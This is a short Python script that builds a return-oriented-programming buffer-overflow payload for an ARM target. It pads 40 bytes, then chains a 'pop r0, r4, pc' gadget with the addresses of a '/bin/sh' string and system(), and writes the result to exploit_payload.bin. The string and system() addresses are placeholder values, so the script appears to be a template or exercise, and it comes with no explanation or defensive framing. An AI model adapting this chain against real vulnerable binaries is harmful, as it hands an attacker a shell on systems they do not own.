import struct

offset = 40
pop_r0_r4_pc = 0x00021b60
placeholder_r4 = 0x41414141
binsh_addr = 0xdeadbeef  #/bin/sh
system_addr = 0xcafebabe  #system()
payload = b"A" * offset
payload += struct.pack("<I", pop_r0_r4_pc)
payload += struct.pack("<I", binsh_addr)
payload += struct.pack("<I", placeholder_r4)
payload += struct.pack("<I", system_addr)

with open("exploit_payload.bin", "wb") as f:
    f.write(payload)
print(f"Payload of length {len(payload)} bytes written.")
